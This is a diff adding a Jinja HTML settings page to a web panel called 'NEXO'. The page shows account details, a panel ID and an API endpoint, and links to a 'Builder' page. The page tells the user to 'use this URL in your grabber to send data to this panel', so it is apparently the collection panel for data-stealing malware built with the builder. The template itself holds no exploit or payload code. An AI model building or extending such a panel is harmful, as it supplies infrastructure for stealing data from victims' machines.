@@ -1,0 +1,98 @@
+{% extends 'base.html' %}
+
+{% block title %}Settings - NEXO{% endblock %}
+
+{% block content %}
+<div class="sidebar">
+    <div class="logo">
+        <h1><i class="fas fa-bolt"></i> <span>NEXO</span></h1>
+    </div>
+    <ul class="nav-menu">
+        <li class="nav-item">
+            <a href="{{ url_for('dashboard') }}" class="nav-link">
+                <i class="fas fa-home"></i>
+                <span>Dashboard</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('builder') }}" class="nav-link">
+                <i class="fas fa-hammer"></i>
+                <span>Builder</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('settings') }}" class="nav-link active">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a href="{{ url_for('logout') }}" class="nav-link">
+                <i class="fas fa-sign-out-alt"></i>
+                <span>Logout</span>
+            </a>
+        </li>
+    </ul>
+</div>
+
+<main class="main-content">
+    <div class="header">
+        <h2>Settings</h2>
+        <div class="user-info">
+            <span>{{ session.username }}</span>
+            <div class="user-avatar">{{ session.username[0].upper() }}</div>
+        </div>
+    </div>
+
+    <div class="table-container" style="padding: 30px; max-width: 800px;">
+        <h3 style="margin-bottom: 25px;"><i class="fas fa-user"></i> Account Information</h3>
+
+        <div class="info-grid" style="display: grid; gap: 20px;">
+            <div style="background: var(--bg-secondary); padding: 20px; border-radius: 12px;">
+                <label style="color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 1px;">Username</label>
+                <div style="font-size: 18px; font-weight: 500; margin-top: 5px;">{{ user.username }}</div>
+            </div>
+
+            <div style="background: var(--bg-secondary); padding: 20px; border-radius: 12px;">
+                <label style="color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 1px;">Panel ID</label>
+                <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+                    <code style="font-size: 14px; background: var(--bg-primary); padding: 8px 12px; border-radius: 8px;">{{ user.panel_id }}</code>
+                    <button class="copy-btn" onclick="copyToClipboard('{{ user.panel_id }}', this)">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div style="background: var(--bg-secondary); padding: 20px; border-radius: 12px;">
+                <label style="color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 1px;">API Endpoint</label>
+                <div style="display: flex; align-items: center; gap: 10px; margin-top: 5px;">
+                    <code style="font-size: 12px; background: var(--bg-primary); padding: 8px 12px; border-radius: 8px; word-break: break-all;">{{ api_url }}</code>
+                    <button class="copy-btn" onclick="copyToClipboard('{{ api_url }}', this)">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+                <p style="font-size: 12px; color: var(--text-muted); margin-top: 10px;">
+                    Use this URL in your grabber to send data to this panel.
+                </p>
+            </div>
+
+            <div style="background: var(--bg-secondary); padding: 20px; border-radius: 12px;">
+                <label style="color: var(--text-secondary); font-size: 12px; text-transform: uppercase; letter-spacing: 1px;">Account Created</label>
+                <div style="font-size: 16px; margin-top: 5px;">{{ user.created_at.strftime('%Y-%m-%d %H:%M:%S') }}</div>
+            </div>
+        </div>
+
+        <div style="margin-top: 30px; padding-top: 30px; border-top: 1px solid var(--border-color);">
+            <h4 style="margin-bottom: 15px; color: var(--text-secondary);">Quick Links</h4>
+            <div style="display: flex; gap: 15px; flex-wrap: wrap;">
+                <a href="{{ url_for('builder') }}" class="btn btn-primary">
+                    <i class="fas fa-hammer"></i> Go to Builder
+                </a>
+                <a href="{{ url_for('dashboard') }}" class="btn btn-secondary">
+                    <i class="fas fa-home"></i> Dashboard
+                </a>
+            </div>
+        </div>
+    </div>
+</main>
+{% endblock %}
